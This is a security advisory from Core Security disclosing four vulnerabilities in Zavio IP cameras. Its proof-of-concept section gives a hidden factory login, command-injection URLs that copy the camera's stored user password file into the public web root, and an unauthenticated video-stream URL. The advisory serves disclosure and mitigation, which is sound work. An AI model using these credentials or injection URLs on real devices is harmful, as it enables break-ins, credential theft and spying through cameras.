Core Security - Corelabs Advisory
http://corelabs.coresecurity.com

Zavio IP Cameras multiple vulnerabilities

1. *Advisory Information*

Title: Zavio IP Cameras multiple vulnerabilities
Advisory ID: CORE-2013-0302
Advisory URL:
http://www.coresecurity.com/advisories/zavio-IP-cameras-multiple-vulnerabilities
Date published: 2013-05-28
Date of last update: 2013-05-28
Vendors contacted: Zavio
Release mode: User release

2. *Vulnerability Information*

Class: Use of hard-coded credentials [CWE-798], OS command injection
[CWE-78], Incorrect default permissions [CWE-276], OS command injection
[CWE-78]
Impact: Code execution, Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-2567, CVE-2013-2568, CVE-2013-2569, CVE-2013-2570

3. *Vulnerability Description*

Multiple vulnerabilities have been found in Zavio IP cameras based on
firmware v1.6.03 and below, that could allow an unauthenticated remote
attacker:

   1. [CVE-2013-2567] to bypass user web interface authentication using
hard-coded credentials.
   2. [CVE-2013-2568] to execute arbitrary commands from the
administration web interface. This flaw can also be used to obtain all
credentials of registered users.
   3. [CVE-2013-2569] to access the camera video stream.
   4. [CVE-2013-2570] to execute arbitrary commands from the
administration web interface (post authentication only).

4. *Vulnerable Packages*

   . Zavio IP cameras based on firmware v1.6.03 and below.
   . All tests and PoCs were run on Zavio F3105 [1] and F312A [2] IP
cameras only. Other Zavio cameras and firmware versions are probably
affected too, but they were not checked.

5. *Non-Vulnerable Packages*

   . Vendor did not provide details. Contact Zavio for further information.

6. *Vendor Information, Solutions and Workarounds*

There was no official answer from Zavio after several attempts to report
these vulnerabilities (see [Sec. 9]). Contact vendor for further
information.
Some mitigation actions may be:

   . Do not expose the camera to Internet unless absolutely necessary.
   . Enable RTSP authentication.
   . Have at least one proxy filtering HTTP requests to
'manufacture.cgi' and 'wireless_mft.cgi'.
   . Check the parameter 'General.Time.NTP.Server' in requests to
'/opt/cgi/view/param'.

7. *Credits*

These vulnerabilities were discovered and researched by Nahuel Riva and
Francisco Falcon from Core Exploit Writers Team. The publication of this
advisory was coordinated by Fernando Miranda from Core Advisories Team.

8. *Technical Description / Proof of Concept Code*

8.1. *Hard-Coded Credentials in Administrative Web Interface*

[CVE-2013-2567] Zavio IP cameras use the Boa web server [3], a popular
tiny server for embedded Linux devices. 'boa.conf' is the Boa
configuration file, and the following account can be found inside:

/-----
# MFT: Specify manufacture commands user name and password
MFT manufacture erutcafunam
-----/

 This account is not visible from the user web interface; users are not
aware of the existence and cannot eliminate it. Through this account it
is possible to access two CGI files located in '/cgi-bin/mft/':

   1. 'manufacture.cgi'
   2. 'wireless_mft.cgi'

The last file contains the OS command injection showed in the following
section.

8.2. *OS Command Injection*

[CVE-2013-2568] The file '/cgi-bin/mft/wireless_mft.cgi', has an OS
command injection in the parameter 'ap' that can be exploited using the
hard-coded credentials showed in the previous section:

/-----
username: manufacture
password: erutcafunam
-----/

 The following proof of concept copies the file where the user
credentials are stored in the web server root directory:

/-----
http://192.168.1.100/cgi-bin/mft/wireless_mft?ap=travesti;cp%20/var/www/secret.passwd%20/web/html/credenciales
-----/

 Afterwards, the user credentials can be obtained by requesting:

/-----
http://192.168.1.100/credenciales
-----/

8.3. *RTSP Authentication Disabled by Default*

[CVE-2013-2569] The RTSP protocol authentication is disabled by default.
Therefore, the live video stream can be accessed by a remote
unauthenticated attacker by requesting:

/-----
rtsp://192.168.1.100/video.h264
-----/

8.4. *OS Command Injection (Post-auth)*

[CVE-2013-2570] The command injection is located in the function
'sub_C8C8' of the binary '/opt/cgi/view/param'. The vulnerable parameter
is 'General.Time.NTP.Server'. The following proof of concept can be used
to obtain the complete list of access points by executing '/sbin/awpriv
ra0 get_site_survey':

/-----
http://192.168.1.100/cgi-bin/admin/param?action=update&General.Time.DateFormat=ymd&General.Time.SyncSource=NTP&General.Time.TimeZone=GMT-06:00/America/Mexico_City&General.Time.NTP.ServerAuto=no&General.Time.NTP.Server=sarasa!de!palermo;/sbin/awpriv%20ra0%20get_site_survey;&General.Time.NTP.Update=01:00:00&General.Time.DayLightSaving.Enabled=on&General.Time.DayLightSaving.Start.Type=date&General.Time.DayLightSaving.Stop.Type=date&General.Time.DayLightSaving.Start.Month=01&General.Time.DayLightSaving.Stop.Month=01&General.Time.DayLightSaving.Start.Week=1&General.Time.DayLightSaving.Stop.Week=1&General.Time.DayLightSaving.Start.Day=01&General.Time.DayLightSaving.Stop.Day=01&General.Time.DayLightSaving.Start.Date=01&General.Time.DayLightSaving.Stop.Date=01&General.Time.DayLightSaving.Start.Hour=00&General.Time.DayLightSaving.Stop.Hour=00&General.Time.DayLightSaving.Start.Min=00&General.Time.DayLightSaving.Stop.Min=00&Image.OSD.Enabled=off
-----/

9. *Report Timeline*
. 2013-03-19:
Core Security Technologies notifies the Zavio Tech Support and requests
a security manager to send a draft report regarding these
vulnerabilities. No reply received.

. 2013-05-02:
Core asks Zavio Tech Support for a security manager to send a
confidential report.

. 2013-05-09:
Core asks for a reply.

. 2013-05-14:
Core asks for a reply.

. 2013-05-21:
Core tries to contact vendor for last time without any reply.

. 2013-05-28:
After 5 failed attempts to report the issues, the advisory
CORE-2013-0302 is published as 'user-release'.

10. *References*

[1] http://www.zavio.com/product.php?id=25.
[2] http://zavio.com/product.php?id=23.
[3] http://www.boa.org/.

11. *About CoreLabs*

CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies. We conduct our research in several important
areas of computer security including system vulnerabilities, cyber
attack planning and simulation, source code auditing, and cryptography.
Our results include problem formalization, identification of
vulnerabilities, novel solutions and prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
http://corelabs.coresecurity.com.

12. *About Core Security Technologies*

Core Security Technologies enables organizations to get ahead of threats
with security test and measurement solutions that continuously identify
and demonstrate real-world exposures to their most critical assets. Our
customers can gain real visibility into their security standing, real
validation of their security controls, and real metrics to more
effectively secure their organizations.

Core Security's software solutions build on over a decade of trusted
research and leading-edge threat expertise from the company's Security
Consulting Services, CoreLabs and Engineering groups. Core Security
Technologies can be reached at +1 (617) 399-6980 or on the Web at:
http://www.coresecurity.com.

13. *Disclaimer*

The contents of this advisory are copyright (c) 2013 Core Security
Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/

14. *PGP/GPG Keys*

This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.